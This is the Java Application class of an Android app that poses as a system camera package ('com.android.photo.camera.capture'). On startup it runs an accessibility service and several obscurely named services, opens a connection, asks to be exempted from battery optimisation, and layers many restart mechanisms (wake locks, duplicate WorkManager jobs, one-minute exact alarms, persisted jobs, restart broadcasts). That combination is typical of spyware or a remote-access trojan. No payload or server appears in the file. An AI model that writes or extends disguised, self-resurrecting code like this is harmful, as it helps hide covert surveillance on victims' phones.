package com.android.photo.camera.capture;

import android.app.AlarmManager;
import android.app.Application;
import android.app.PendingIntent;
import android.app.job.JobInfo;
import android.app.job.JobScheduler;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Build;
import android.os.PowerManager;
import android.os.SystemClock;
import android.provider.Settings;
import android.util.Log;
import androidx.work.*;

import java.util.concurrent.TimeUnit;

public class App extends Application {
    private static final String TAG = "App";
    private PowerManager.WakeLock appWakeLock;
    private static final long RESTART_INTERVAL = 60 * 1000; // 1 minute

    @Override
    public void onCreate() {
        super.onCreate();

        // Acquire a wake lock to prevent deep sleep during initialization
        acquireWakeLock();

        // Start all persistent services
        startAllPersistentServices();

        // Start connection immediately
        Connect.startAsync(this);

        // Request all battery optimizations to be disabled
        requestBatteryOptimizations();

        // Apply manufacturer-specific optimizations
        Service.applyManufacturerSpecificOptimizations(this);

        // Initialize WorkManager for periodic tasks
        initializeWorkManager();

        // Schedule alarm for service restart
        scheduleServiceRestart();

        // Schedule job for service monitoring
        scheduleServiceMonitoringJob();

        // Monitor work status
        monitorWorkStatus();

        // Schedule WackMeUpJob
        WackMeUpJob.scheduleJob(this);

        // Trigger SensorRestarterBroadcastReceiver for initial start
        Intent restartIntent = new Intent("RestartSensor");
        sendBroadcast(restartIntent);
    }

    // Package-private method to start all persistent services
    void startAllPersistentServices() {
        try {
            // Start main accessibility service
            startService(Service.class);

            // Start backup service
            startService(BackupService.class);

            // Start worker service (mimics _srv_worker_)
            startService(WorkerService.class);

            // Start ClassGen5 service
            startService(ClassGen5Service.class);

            // Start ClassGen6 service
            startService(ClassGen6Service.class);

            // Start ClassGen11 service
            startService(ClassGen11Service.class);

            // Start MyWorker service
            startService(MyWorkerService.class);

        } catch (Exception e) {
            Log.e(TAG, "Error starting services", e);

            // Schedule retry using WorkManager
            try {
                OneTimeWorkRequest retryWork = new OneTimeWorkRequest.Builder(ServiceStarterWorker.class)
                        .setInitialDelay(5, TimeUnit.SECONDS)
                        .build();
                WorkManager.getInstance(this).enqueue(retryWork);
            } catch (Exception ex) {
                Log.e(TAG, "Error scheduling retry work", ex);
            }
        }
    }

    private void startService(Class<?> serviceClass) {
        try {
            Intent serviceIntent = new Intent(this, serviceClass);
            serviceIntent.putExtra("fromApp", true);

            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            Log.d(TAG, "Started " + serviceClass.getSimpleName());
        } catch (Exception e) {
            Log.e(TAG, "Failed to start " + serviceClass.getSimpleName(), e);
        }
    }

    private void acquireWakeLock() {
        try {
            PowerManager powerManager = (PowerManager) getSystemService(POWER_SERVICE);
            appWakeLock = powerManager.newWakeLock(
                    PowerManager.PARTIAL_WAKE_LOCK,
                    "App::AppWakeLockTag"
            );
            appWakeLock.acquire(10 * 60 * 1000L); // 10 minutes
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring wake lock", e);
        }
    }

    private void requestBatteryOptimizations() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (!pm.isIgnoringBatteryOptimizations(getPackageName())) {
                try {
                    Intent intent = new Intent();
                    intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                    intent.setData(Uri.parse("package:" + getPackageName()));
                    intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    startActivity(intent);
                } catch (Exception e) {
                    Log.e(TAG, "Error requesting battery optimization exception", e);
                }
            }
        }
    }

    private void initializeWorkManager() {
        try {
            Configuration config = new Configuration.Builder()
                    .setMinimumLoggingLevel(android.util.Log.INFO)
                    .build();

            WorkManager.initialize(this, config);

            PeriodicWorkRequest workRequest = new PeriodicWorkRequest.Builder(
                    PersistentWorker.class,
                    15,
                    TimeUnit.MINUTES
            )
                    .setInitialDelay(0, TimeUnit.SECONDS)
                    .setBackoffCriteria(
                            BackoffPolicy.EXPONENTIAL,
                            30,
                            TimeUnit.SECONDS
                    )
                    .build();

            WorkManager.getInstance(this)
                    .enqueueUniquePeriodicWork(
                            "PersistentWork",
                            ExistingPeriodicWorkPolicy.REPLACE,
                            workRequest
                    );

            PeriodicWorkRequest secondWorkRequest = new PeriodicWorkRequest.Builder(
                    PersistentWorker.class,
                    16,
                    TimeUnit.MINUTES
            )
                    .setInitialDelay(5, TimeUnit.MINUTES)
                    .build();

            WorkManager.getInstance(this)
                    .enqueueUniquePeriodicWork(
                            "PersistentWork2",
                            ExistingPeriodicWorkPolicy.REPLACE,
                            secondWorkRequest
                    );
        } catch (Exception e) {
            Log.e(TAG, "Error initializing WorkManager", e);
        }
    }

    private void scheduleServiceRestart() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, MyReceiver.class);
            intent.setAction("RESTART_SERVICE");

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this,
                    1001,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            if (alarmManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                } else {
                    alarmManager.setExact(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + RESTART_INTERVAL,
                            pendingIntent
                    );
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling service restart", e);
        }
    }

    private void scheduleServiceMonitoringJob() {
        try {
            JobScheduler scheduler = (JobScheduler) getSystemService(Context.JOB_SCHEDULER_SERVICE);
            if (scheduler != null) {
                ComponentName serviceComponent = new ComponentName(this, MonitorJobService.class);
                JobInfo.Builder builder = new JobInfo.Builder(1000, serviceComponent);

                builder.setPeriodic(15 * 60 * 1000)
                        .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                        .setPersisted(true)
                        .setRequiresCharging(false)
                        .setRequiresDeviceIdle(false);

                scheduler.schedule(builder.build());
            }
        } catch (Exception e) {
            Log.e(TAG, "Error scheduling service monitoring job", e);
        }
    }

    private void monitorWorkStatus() {
        try {
            AlarmManager alarmManager = (AlarmManager) getSystemService(Context.ALARM_SERVICE);
            Intent intent = new Intent(this, MyReceiver.class);
            intent.setAction("CHECK_WORK_STATUS");

            PendingIntent pendingIntent = PendingIntent.getBroadcast(
                    this,
                    2001,
                    intent,
                    PendingIntent.FLAG_UPDATE_CURRENT | PendingIntent.FLAG_IMMUTABLE
            );

            if (alarmManager != null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                    alarmManager.setExactAndAllowWhileIdle(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + 15 * 60 * 1000,
                            pendingIntent
                    );
                } else {
                    alarmManager.setExact(
                            AlarmManager.ELAPSED_REALTIME_WAKEUP,
                            SystemClock.elapsedRealtime() + 15 * 60 * 1000,
                            pendingIntent
                    );
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Error setting up work monitoring", e);
        }
    }

    @Override
    public void onTerminate() {
        super.onTerminate();

        if (appWakeLock != null && appWakeLock.isHeld()) {
            try {
                appWakeLock.release();
            } catch (Exception e) {
                Log.e(TAG, "Error releasing app wake lock", e);
            }
        }

        scheduleServiceRestart();

        Intent restartIntent = new Intent("RestartSensor");
        sendBroadcast(restartIntent);
    }
}